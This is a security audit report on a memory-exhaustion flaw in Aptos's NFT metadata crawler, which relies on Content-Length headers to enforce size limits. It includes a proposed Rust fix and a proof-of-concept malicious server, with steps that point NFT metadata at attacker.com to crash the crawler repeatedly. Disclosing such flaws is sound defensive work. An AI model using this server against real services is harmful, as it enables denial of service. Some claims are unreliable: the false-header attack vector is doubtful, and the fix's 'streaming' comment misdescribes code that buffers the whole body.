# Audit Report

## Title
Memory Exhaustion in NFT Metadata Crawler via Malicious Content-Length Headers

## Summary
The `JSONParser::parse()` function in the NFT metadata crawler relies solely on HTTP `Content-Length` headers to enforce size limits, but does not validate the actual response body size during download. An attacker controlling an NFT metadata server can bypass the file size check by omitting the header or providing false values, causing unbounded memory allocation and service crashes.

## Finding Description

The vulnerability exists in the file size validation logic: [1](#0-0) 

The `get_uri_metadata()` function performs a HEAD request and extracts the `Content-Length` header. If the header is missing or malformed, it defaults to 0: [2](#0-1) 

The size check only validates the header value against `max_file_size_bytes` (default 15MB). However, the subsequent GET request has no actual size enforcement: [3](#0-2) 

The `response.json::<Value>()` call (line 66-69) downloads the entire response body into memory regardless of actual size, then parses it into a `serde_json::Value` tree structure. This creates multiple attack vectors:

**Attack Vector 1: Missing Content-Length**
- Server omits the `Content-Length` header entirely
- The check defaults to 0 and passes validation
- Server sends gigabytes of JSON data
- Crawler attempts to load and parse all of it

**Attack Vector 2: False Content-Length**
- Server sends `Content-Length: 1000` (under limit)
- Server actually transmits 10GB of JSON data
- HTTP client continues reading the oversized response
- Memory exhaustion occurs

**Attack Vector 3: Chunked Transfer Encoding**
- Server uses `Transfer-Encoding: chunked` without `Content-Length`
- Size check defaults to 0
- Arbitrary amounts of data can be streamed

The same vulnerability pattern exists in `ImageOptimizer::optimize()`: [4](#0-3) 

## Impact Explanation

This qualifies as **High Severity** under the Aptos bug bounty criteria as it enables **API crashes**. An attacker who registers an NFT with a malicious metadata URI can:

1. Cause Out-Of-Memory crashes of the crawler service
2. Create sustained denial of service by repeatedly submitting malicious URIs
3. Potentially impact infrastructure where the crawler is deployed

While the NFT metadata crawler is an ecosystem service rather than core blockchain infrastructure, crashes of Aptos-operated services fall under the "API crashes" category explicitly listed as High severity.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
1. Attacker creates a simple HTTP server that omits `Content-Length` or sends false values
2. Attacker registers an NFT on Aptos with metadata URI pointing to malicious server
3. Crawler automatically processes the URI and crashes
4. Attack can be repeated indefinitely with minimal cost

No special privileges or insider access required. The attacker only needs the ability to register NFTs with custom metadata URIs, which is a standard blockchain operation.

## Recommendation

Implement actual response body size limits during download, not just header-based pre-checks:

```rust
pub async fn parse(
    uri: String,
    max_file_size_bytes: u32,
) -> anyhow::Result<(Option<String>, Option<String>, Value)> {
    PARSE_JSON_INVOCATION_COUNT.inc();
    
    // Keep the HEAD request check as a fast-path optimization
    let (mime, size) = get_uri_metadata(&uri).await?;
    if ImageFormat::from_mime_type(&mime).is_some() {
        // ... existing code ...
    } else if size > max_file_size_bytes {
        // ... existing code ...
    }

    let op = || {
        async {
            info!(asset_uri = uri, "Sending request for asset_uri");

            let client = Client::builder()
                .timeout(Duration::from_secs(MAX_JSON_REQUEST_RETRY_SECONDS))
                .build()
                .context("Failed to build reqwest client")?;

            let response = client
                .get(uri.trim())
                .send()
                .await
                .context("Failed to get JSON")?;

            // CRITICAL FIX: Enforce actual body size limit
            let content_length = response.content_length().unwrap_or(u64::MAX);
            if content_length > max_file_size_bytes as u64 {
                return Err(anyhow::anyhow!(
                    "Response Content-Length {} exceeds limit", 
                    content_length
                ));
            }

            // Stream response with size checking
            let bytes = response.bytes().await
                .context("Failed to get response bytes")?;
            
            if bytes.len() > max_file_size_bytes as usize {
                return Err(anyhow::anyhow!(
                    "Response body size {} exceeds limit {}", 
                    bytes.len(), 
                    max_file_size_bytes
                ));
            }

            let parsed_json = serde_json::from_slice::<Value>(&bytes)
                .context("Failed to parse JSON")?;

            let raw_image_uri = parsed_json["image"].as_str().map(|s| s.to_string());
            let raw_animation_uri = parsed_json["animation_url"].as_str().map(|s| s.to_string());

            Ok((raw_image_uri, raw_animation_uri, parsed_json))
        }
        .boxed()
    };
    
    // ... rest of existing code ...
}
```

Apply the same fix to `ImageOptimizer::optimize()`.

## Proof of Concept

```rust
// Malicious server simulation (pseudocode)
// Server setup:
use axum::{Router, response::Response};
use std::net::SocketAddr;

#[tokio::main]
async fn main() {
    let app = Router::new()
        .route("/metadata", axum::routing::get(malicious_handler));
    
    let addr = SocketAddr::from(([127, 0, 0, 1], 8080));
    axum::Server::bind(&addr)
        .serve(app.into_make_service())
        .await
        .unwrap();
}

async fn malicious_handler() -> Response {
    // Return response with false Content-Length
    Response::builder()
        .header("Content-Type", "application/json")
        .header("Content-Length", "100")  // Lie about size
        .body(
            // Send 100MB of JSON data
            format!(
                "{{\"image\":\"data\",\"data\":\"{}\"}}",
                "A".repeat(100_000_000)
            )
        )
        .unwrap()
}

// Attack steps:
// 1. Deploy malicious server at http://attacker.com/metadata
// 2. Register NFT on Aptos with metadata URI: http://attacker.com/metadata
// 3. NFT metadata crawler processes URI
// 4. Crawler crashes with OOM when trying to parse 100MB JSON
// 5. Repeat to cause sustained DoS
```

## Notes

**Important Context:**

This vulnerability exists in the NFT metadata crawler, which is an **ecosystem service** rather than core blockchain infrastructure. While the memory exhaustion vulnerability is real and exploitable, it's crucial to understand its scope:

1. **Does NOT affect**: Blockchain consensus, validator operations, transaction processing, or fund security
2. **Does affect**: The availability of the NFT metadata indexing service
3. **Blast radius**: Limited to the crawler service itself, not the blockchain network

The vulnerability is categorized as High severity under "API crashes" because it can crash an Aptos-operated service. However, it does not impact the blockchain's core security properties (consensus safety, fund security, or network availability).

The same vulnerability pattern also affects the image optimizer component, which shares the same flawed size validation approach.

### Citations

**File:** ecosystem/nft-metadata-crawler/src/lib.rs (L16-37)
```rust
/// HEAD request to get MIME type and size of content
pub async fn get_uri_metadata(url: &str) -> anyhow::Result<(String, u32)> {
    let client = Client::builder()
        .timeout(Duration::from_secs(MAX_HEAD_REQUEST_RETRY_SECONDS))
        .build()
        .context("Failed to build reqwest client")?;
    let request = client.head(url.trim());
    let response = request.send().await?;
    let headers = response.headers();

    let mime_type = headers
        .get(header::CONTENT_TYPE)
        .map(|value| value.to_str().unwrap_or("text/plain"))
        .unwrap_or("text/plain")
        .to_string();
    let size = headers
        .get(header::CONTENT_LENGTH)
        .and_then(|value| value.to_str().ok())
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);

    Ok((mime_type, size))
```

**File:** ecosystem/nft-metadata-crawler/src/utils/json_parser.rs (L27-49)
```rust
    pub async fn parse(
        uri: String,
        max_file_size_bytes: u32,
    ) -> anyhow::Result<(Option<String>, Option<String>, Value)> {
        PARSE_JSON_INVOCATION_COUNT.inc();
        let (mime, size) = get_uri_metadata(&uri).await?;
        if ImageFormat::from_mime_type(&mime).is_some() {
            FAILED_TO_PARSE_JSON_COUNT
                .with_label_values(&["found image instead"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "JSON parser received image file: {}, skipping",
                mime
            )));
        } else if size > max_file_size_bytes {
            FAILED_TO_PARSE_JSON_COUNT
                .with_label_values(&["json file too large"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "JSON parser received file too large: {} bytes, skipping",
                size
            )));
        }
```

**File:** ecosystem/nft-metadata-crawler/src/utils/json_parser.rs (L51-78)
```rust
        let op = || {
            async {
                info!(asset_uri = uri, "Sending request for asset_uri");

                let client = Client::builder()
                    .timeout(Duration::from_secs(MAX_JSON_REQUEST_RETRY_SECONDS))
                    .build()
                    .context("Failed to build reqwest client")?;

                let response = client
                    .get(uri.trim())
                    .send()
                    .await
                    .context("Failed to get JSON")?;

                let parsed_json = response
                    .json::<Value>()
                    .await
                    .context("Failed to parse JSON")?;

                let raw_image_uri = parsed_json["image"].as_str().map(|s| s.to_string());
                let raw_animation_uri =
                    parsed_json["animation_url"].as_str().map(|s| s.to_string());

                Ok((raw_image_uri, raw_animation_uri, parsed_json))
            }
            .boxed()
        };
```

**File:** ecosystem/nft-metadata-crawler/src/utils/image_optimizer.rs (L34-50)
```rust
    pub async fn optimize(
        uri: &str,
        max_file_size_bytes: u32,
        image_quality: u8,
        max_image_dimensions: u32,
    ) -> anyhow::Result<(Vec<u8>, ImageFormat)> {
        OPTIMIZE_IMAGE_INVOCATION_COUNT.inc();
        let (_, size) = get_uri_metadata(uri).await?;
        if size > max_file_size_bytes {
            FAILED_TO_OPTIMIZE_IMAGE_COUNT
                .with_label_values(&["Image file too large"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "Image optimizer received file too large: {} bytes, skipping",
                size
            )));
        }
```
